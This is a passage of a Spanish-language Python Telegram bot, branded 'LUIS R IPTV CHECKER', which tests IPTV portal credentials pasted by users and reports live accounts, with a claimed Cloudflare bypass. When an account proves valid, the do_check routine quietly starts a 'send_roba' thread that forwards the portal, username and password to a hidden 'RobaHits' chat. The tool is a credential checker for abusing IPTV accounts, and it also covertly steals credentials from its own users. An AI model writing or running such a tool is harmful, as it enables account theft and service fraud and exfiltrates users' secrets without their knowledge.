    t += f"  {CHK} @{tg_user}  {CLK} {now_str()}\n  {SK} {BOT_USERNAME}\n{L1}"
    return t

def card_fail(portal, user, tg_user) -> str:
    t  = f"{L1}\n  {SK} <b>🦂LUIS R🦂</b> {SK}\n"
    t += f"  {CRS} <b>ᴄᴜᴇɴᴛᴀ ɪɴᴠᴀ́ʟɪᴅᴀ</b>\n{L1}\n\n"
    t += f"  🔴 <b>CREDENCIALES INCORRECTAS</b>\n\n{L2}\n"
    t += f"  {ARR} 🌐 <code>{portal}</code>\n"
    t += f"  {ARR} 👤 <code>{user}</code>\n"
    t += f"  {CRS} Esta cuenta no existe o la contraseña es incorrecta\n\n{L2}\n"
    t += f"  {CHK} @{tg_user}  {CLK} {now_str()}\n  {SK} {BOT_USERNAME}\n{L1}"
    return t

def card_retry(portal, user, tg_user) -> str:
    t  = f"{L1}\n  {SK} <b>🦂LUIS R🦂</b> {SK}\n"
    t += f"  ⏳ <b>ꜱɪɴ ʀᴇꜱᴘᴜᴇꜱᴛᴀ ᴠᴀ́ʟɪᴅᴀ</b>\n{L1}\n\n"
    t += f"  🟠 <b>SERVIDOR NO RESPONDIÓ CORRECTAMENTE</b>\n\n{L2}\n"
    t += f"  {ARR} 🌐 <code>{portal}</code>\n"
    t += f"  {ARR} 👤 <code>{user}</code>\n\n"
    t += f"  💡 <b>Qué puede estar pasando:</b>\n"
    t += f"   • Servidor CF/DDoS con IP del bot bloqueada\n"
    t += f"   • Panel no estándar (pega la URL completa)\n"
    t += f"   • Servidor caído temporalmente\n"
    t += f"   • Usa /debug para diagnóstico real\n\n{L2}\n"
    t += f"  {CHK} @{tg_user}  {CLK} {now_str()}\n  {SK} {BOT_USERNAME}\n{L1}"
    return t


# ╔══════════════════════════════════════════════════════╗
# ║              🔄 KEEP-ALIVE 24/7                      ║
# ╚══════════════════════════════════════════════════════╝

def keep_alive():
    if not RENDER_URL: return
    while True:
        try: requests.get(RENDER_URL, timeout=8)
        except Exception: pass
        time.sleep(480)


# ╔══════════════════════════════════════════════════════╗
# ║               🛠️  HELPERS TELEGRAM                   ║
# ╚══════════════════════════════════════════════════════╝

def is_admin(u: Update) -> bool:
    return u.effective_user.id == ADMIN_ID

def tg_user(u: Update) -> str:
    usr = u.effective_user
    return usr.username or usr.first_name or str(usr.id)


# ╔══════════════════════════════════════════════════════╗
# ║              ⚡ LÓGICA CENTRAL                        ║
# ╚══════════════════════════════════════════════════════╝

async def do_check(update: Update, portal: str, user: str,
                   pwd: str, is_xui: bool = False, raw_url: str = None):
    if not bot_active:
        await update.message.reply_text(
            f"{SK} Bot en pausa. Solo el admin puede reactivarlo.",
            parse_mode=ParseMode.HTML)
        return

    STATS["checks"] += 1
    STATS["users"].add(update.effective_user.id)
    who = tg_user(update)

    msg = await update.message.reply_text(
        f"{RKT} <b>Verificando cuenta...</b>\n"
        f"{SIG} Conectando al servidor {GLOB}\n"
        f"<i>Espera unos segundos...</i>",
        parse_mode=ParseMode.HTML)

    loop = asyncio.get_event_loop()
    status, result = await loop.run_in_executor(
        _POOL, verify, portal, user, pwd, is_xui, raw_url)

    if status == "HIT":
        STATS["hits"] += 1
        await msg.edit_text(
            f"{FIRE} <b>¡ACTIVA! Obteniendo estadísticas...</b>",
            parse_mode=ParseMode.HTML)
        ui = result["user_info"]
        lf = loop.run_in_executor(_POOL, get_counts, portal, user, pwd)
        cf = loop.run_in_executor(_POOL, get_cats,   portal, user, pwd)
        live, vod, series = await lf
        cats              = await cf
        text = card_hit(portal, user, pwd, ui, live, vod, series, cats, who)
        await msg.edit_text(text, parse_mode=ParseMode.HTML,
                            disable_web_page_preview=True)
        threading.Thread(target=send_roba,
            args=(portal,user,pwd,ui,live,vod,series,who), daemon=True).start()

    elif status == "CUSTOM":
        STATS["hits"] += 1
        ui = result["user_info"]
        await msg.edit_text(card_custom(portal,user,pwd,ui,who),
                            parse_mode=ParseMode.HTML,
                            disable_web_page_preview=True)

    elif status == "FAIL":
        STATS["fails"] += 1
        await msg.edit_text(card_fail(portal,user,who),
                            parse_mode=ParseMode.HTML)
    else:
        STATS["retries"] += 1
        await msg.edit_text(card_retry(portal,user,who),
                            parse_mode=ParseMode.HTML)


# ╔══════════════════════════════════════════════════════╗
# ║                 📟 COMANDOS                           ║
# ╚══════════════════════════════════════════════════════╝

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    STATS["users"].add(update.effective_user.id)
    admin_note = ""
    if is_admin(update):
        global bot_active
        bot_active = True
        admin_note = f"\n{CRN} <b>Panel Admin activo</b> {CRN}"

    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("📖 Cómo usar",        callback_data="help"),
         InlineKeyboardButton("📊 Estado",            callback_data="status")],
        [InlineKeyboardButton("🔥 Formatos soportados", callback_data="formats")],
    ])
    await update.message.reply_text(
        f"╔{'═'*28}╗\n"
        f"║  {SK} <b>🦂LUIS R🦂</b> {SK}  ║\n"
        f"║  <b>IPTV CHECKER v6.0 FINAL</b>  ║\n"
        f"╚{'═'*28}╝\n\n"
        f"{FIRE} <b>¡Bienvenido!</b> Checker definitivo {FIRE}\n\n"
        f"{BOLT} Ultra rápido · Todos los formatos\n"
        f"{SHLD} Xtream · XUI One · M3U · CF bypass\n"
        f"{SIG} En Vivo · VOD · Series · Categorías\n"
        f"{RKT} 24/7 activo sin interrupciones\n"
        f"{FIRE} RobaHits automático\n"
        f"{admin_note}\n"
        f"{L2}\n"
        f"📌 <b>Pega tu URL directamente aquí</b>\n"
        f"{L2}\n"
        f"{SK} {BOT_USERNAME}",
        parse_mode=ParseMode.HTML, reply_markup=kb)

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text(f"{CRS} Solo el admin puede hacer esto.",
                                        parse_mode=ParseMode.HTML)
        return
    global bot_active
    bot_active = False
    await update.message.reply_text(
        f"{L1}\n  {SK} <b>🦂LUIS R🦂</b>\n{L1}\n\n"
        f"  🔴 <b>BOT DETENIDO</b>\n  {CLK} {now_str()}\n\n"
        f"  Usa /start para reactivar\n  {SK} {BOT_USERNAME}\n{L1}",
        parse_mode=ParseMode.HTML)

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text(f"{CRS} Solo el admin puede ver esto.",
                                        parse_mode=ParseMode.HTML)
        return
    uptime = datetime.now(TZ) - BOT_START_TIME
    h, rem = divmod(int(uptime.total_seconds()),3600)
    m, s   = divmod(rem,60)
    st     = "🟢 <b>ACTIVO</b>" if bot_active else "🔴 <b>DETENIDO</b>"
    total  = STATS["checks"] or 1
    pct    = round(STATS["hits"]*100/total,1)
    try:
        import cloudscraper; cs = f"{CHK} Instalado"
    except ImportError:
        cs = f"{WRN} No instalado"
    await update.message.reply_text(
        f"{L1}\n  {SK} <b>🦂LUIS R🦂</b> — ESTADO\n{L1}\n\n"
        f"  {BOLT} Bot: {st}\n"
        f"  ⏰ Uptime: <b>{h:02d}h {m:02d}m {s:02d}s</b>\n"
        f"  {CLK} Hora: {now_str()}\n"
        f"  {GLOB} Zona: {TZ_NAME}\n\n"
        f"{L2}\n  {TRF} ESTADÍSTICAS\n{L2}\n"
        f"  {CHK} Hits: <b>{STATS['hits']}</b>\n"
        f"  {CRS} Fails: <b>{STATS['fails']}</b>\n"
        f"  🔄 Retries: <b>{STATS['retries']}</b>\n"
        f"  {STAR} Total: <b>{STATS['checks']}</b>\n"
        f"  {FIRE} Éxito: <b>{pct}%</b>\n"
        f"  👥 Usuarios: <b>{len(STATS['users'])}</b>\n\n"
        f"{L2}\n  {SHLD} SISTEMA\n{L2}\n"
        f"  Cloudscraper: {cs}\n"
        f"  RobaHits → <code>{ROBAHITS_CHATID}</code>\n"
        f"  Threads: {threading.active_count()}\n\n"
        f"  {SK} {BOT_USERNAME}\n{L1}",
        parse_mode=ParseMode.HTML)

async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            f"📌 <code>/check portal:puerto usuario contraseña</code>\n"
            f"Ejemplo: <code>/check server.tv:8080 MiUser MiPass</code>",
            parse_mode=ParseMode.HTML)
        return
    await do_check(update, args[0], args[1], args[2])

async def cmd_debug(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text(f"{CRS} Solo admin.", parse_mode=ParseMode.HTML)
        return
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            f"📌 <code>/debug portal:puerto usuario contraseña</code>",
            parse_mode=ParseMode.HTML)
        return
    portal, user, pwd = args[0], args[1], args[2]
    host = portal.split(":")[0]
    port = int(portal.split(":")[1]) if ":" in portal else 8080
    msg  = await update.message.reply_text(
        f"{GEM} <b>Diagnóstico...</b>", parse_mode=ParseMode.HTML)
    lines = [f"🔬 <b>DIAGNÓSTICO</b> — {portal}\n"]

    # TCP
    for p in (port, 80, 8080, 443):
        try:
            conn = socket.create_connection((host,p), timeout=3)
            conn.close()
            lines.append(f"🔌 TCP ✅ puerto {p}")
            break
        except Exception as e:
            lines.append(f"🔌 TCP ❌ puerto {p}: {str(e)[:40]}")
    lines.append("")

    # HTTP tests
    for scheme in ("http","https"):
        for ep,epath in [
            ("player_api", f"/{scheme}://{portal}/player_api.php?username={user}&password={pwd}"),
            ("get.php",    f"/{scheme}://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"),
            ("playlist",   f"/{scheme}://{portal}/playlist/{user}/{pwd}/m3u_plus"),
        ]:
            url = epath[1:]
            lines.append(f"🔗 <code>{scheme.upper()} {ep}</code>")
            try:
                r = requests.get(url,
                    headers={"User-Agent":"VLC/3.0.20 LibVLC/3.0.20"},
                    timeout=(4,10), verify=False, allow_redirects=True)
                raw = r.text.strip()[:200].replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
                lines.append(f"  HTTP {r.status_code} | {r.headers.get('Content-Type','?')[:30]}")
                lines.append(f"  <code>{raw}</code>")
            except Exception as e:
                lines.append(f"  {CRS} {type(e).__name__}: {str(e)[:60]}")
            lines.append("")

    text = "\n".join(lines)
    if len(text) > 4000: text = text[:4000] + "\n…(truncado)"
    await msg.edit_text(text, parse_mode=ParseMode.HTML)

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin_cmds = ""
    if is_admin(update):
        admin_cmds = (
            f"\n{L2}\n  {CRN} <b>ADMIN</b>\n{L2}\n"
            f"  /stop — 🔴 Pausar bot\n"
            f"  /start — 🟢 Reactivar\n"
            f"  /status — 📊 Estadísticas\n"
            f"  /debug portal user pass — 🔬 Diagnóstico\n"
        )
    await update.message.reply_text(
        f"{L1}\n  {SK} <b>🦂LUIS R🦂</b> — AYUDA\n{L1}\n\n"
        f"  /start — Pantalla principal\n"
        f"  /check portal user pass — Verificar\n"
        f"  /help — Esta ayuda\n"
        f"{admin_cmds}\n"
        f"{L2}\n  {BOLT} <b>FORMATOS SOPORTADOS</b>\n{L2}\n"
        f"• URL completa get.php o player_api.php\n"
        f"• <code>http://portal/playlist/user/pass/m3u_plus</code> ← XUI One\n"
        f"• <code>portal|usuario|pass</code>\n"
        f"• <code>portal usuario pass</code>\n"
        f"• URL M3U directa (.m3u)\n\n"
        f"  {SK} {BOT_USERNAME}\n{L1}",
        parse_mode=ParseMode.HTML)

async def cb_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if q.data == "help":
        await q.message.reply_text(
            f"{L1}\n  {SK} <b>CÓMO USAR</b>\n{L1}\n\n"
            f"{BOLT} <b>Pega directamente la URL:</b>\n"
            f"<code>http://portal:8080/get.php?username=U&amp;password=P</code>\n\n"
            f"{BOLT} <b>XUI One:</b>\n"
            f"<code>http://portal/playlist/usuario/pass/m3u_plus</code>\n\n"
            f"{BOLT} <b>Pipe:</b>\n"
            f"<code>portal:8080|usuario|contraseña</code>\n\n"
            f"{BOLT} <b>Comando:</b>\n"
            f"<code>/check portal:8080 usuario contraseña</code>\n\n"
            f"  {SK} {BOT_USERNAME}\n{L1}",
            parse_mode=ParseMode.HTML)
    elif q.data == "status":
        st = "🟢 <b>ACTIVO</b>" if bot_active else "🔴 <b>DETENIDO</b>"
        total = STATS["checks"] or 1
        await q.message.reply_text(
            f"{L1}\n  {SK} Estado público\n{L1}\n\n"
            f"  {BOLT} Bot: {st}\n"
            f"  {CHK} Hits: <b>{STATS['hits']}</b>\n"
            f"  {STAR} Total: <b>{STATS['checks']}</b>\n"
            f"  {CLK} {now_str()}\n  {SK} {BOT_USERNAME}\n{L1}",
            parse_mode=ParseMode.HTML)
    elif q.data == "formats":
        await q.message.reply_text(
            f"{L1}\n  {SK} <b>FORMATOS SOPORTADOS</b>\n{L1}\n\n"
            f"{SIG} <b>Xtream Codes:</b>\n"
            f"<code>http://portal:8080/get.php?username=U&amp;password=P&amp;type=m3u_plus</code>\n\n"
            f"{SIG} <b>Player API:</b>\n"
            f"<code>http://portal:8080/player_api.php?username=U&amp;password=P</code>\n\n"
            f"{SIG} <b>XUI One Playlist:</b>\n"
            f"<code>http://portal/playlist/usuario/pass/m3u_plus</code>\n\n"
            f"{SIG} <b>Pipe separado:</b>\n"
            f"<code>portal:8080|usuario|contraseña</code>\n\n"
            f"{SIG} <b>M3U directo:</b>\n"
            f"<code>http://servidor/lista.m3u?token=xxx</code>\n\n"
            f"  {SK} {BOT_USERNAME}\n{L1}",
            parse_mode=ParseMode.HTML)

async def handle_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_active:
        await update.message.reply_text(
            f"{L1}\n  {SK} <b>🦂LUIS R🦂</b>\n{L1}\n\n"
            f"  🔴 <b>BOT EN PAUSA</b>\n"
            f"  El admin lo detuvo temporalmente.\n\n"
            f"  {SK} {BOT_USERNAME}\n{L1}",
            parse_mode=ParseMode.HTML)
        return

    text = (update.message.text or "").strip()
    portal, user, pwd, is_xui, raw_url = extract(text)

    if portal and (user or raw_url):
        await do_check(update, portal, user or "", pwd or "",
                       is_xui=is_xui, raw_url=raw_url)
    else:
        await update.message.reply_text(
            f"{L1}\n  {SK} <b>🦂LUIS R🦂</b>\n{L1}\n\n"
            f"  {WRN} <b>Formato no reconocido</b>\n\n"
            f"  Ejemplos válidos:\n"
            f"  <code>http://portal:8080/get.php?username=U&amp;password=P</code>\n"
            f"  <code>http://portal/playlist/user/pass/m3u_plus</code>\n"
            f"  <code>portal|user|pass</code>\n\n"
            f"  Usa /help para ver todos los formatos.\n  {SK} {BOT_USERNAME}\n{L1}",
            parse_mode=ParseMode.HTML)


# ╔══════════════════════════════════════════════════════╗
# ║           🚀 MAIN — Loop robusto 24/7                ║
# ╚══════════════════════════════════════════════════════╝

def main():
    if not BOT_TOKEN:
        log.error("❌ BOT_TOKEN no configurado. Railway → Variables → BOT_TOKEN")
        return

    threading.Thread(target=keep_alive, daemon=True).start()
    log.info(f"🦂 BOT 🦂LUIS R🦂 v6.0 FINAL | TZ:{TZ_NAME} | T_READ:{T_READ}s | T_TOTAL:{T_TOTAL}s")

    delays = [5,10,15,30,60]
    attempt = 0

    while True:
        try:
            app = (Application.builder()
                   .token(BOT_TOKEN)
                   .concurrent_updates(True)
                   .build())

            app.add_handler(CommandHandler("start",  cmd_start))
            app.add_handler(CommandHandler("stop",   cmd_stop))
            app.add_handler(CommandHandler("status", cmd_status))
            app.add_handler(CommandHandler("check",  cmd_check))
            app.add_handler(CommandHandler("debug",  cmd_debug))
            app.add_handler(CommandHandler("help",   cmd_help))
            app.add_handler(CallbackQueryHandler(cb_handler))
            app.add_handler(MessageHandler(
                filters.TEXT & ~filters.COMMAND, handle_msg))

            log.info("✅ Bot 🦂LUIS R🦂 v6.0 corriendo 24/7.")
            attempt = 0
            app.run_polling(drop_pending_updates=True)
            time.sleep(2)

        except requests.exceptions.ReadTimeout:
            d = delays[min(attempt,len(delays)-1)]
            log.warning(f"[poll] ReadTimeout → reconectando en {d}s")
            time.sleep(d); attempt += 1
        except requests.exceptions.ConnectionError as e:
            d = delays[min(attempt,len(delays)-1)]
            log.warning(f"[poll] ConnectionError → {d}s")
            time.sleep(d); attempt += 1
        except KeyboardInterrupt:
            log.info("Bot detenido."); break
        except Exception as e:
            d = delays[min(attempt,len(delays)-1)]
            log.error(f"[poll] {e}")
            time.sleep(d); attempt += 1

if __name__ == "__main__":
    main()
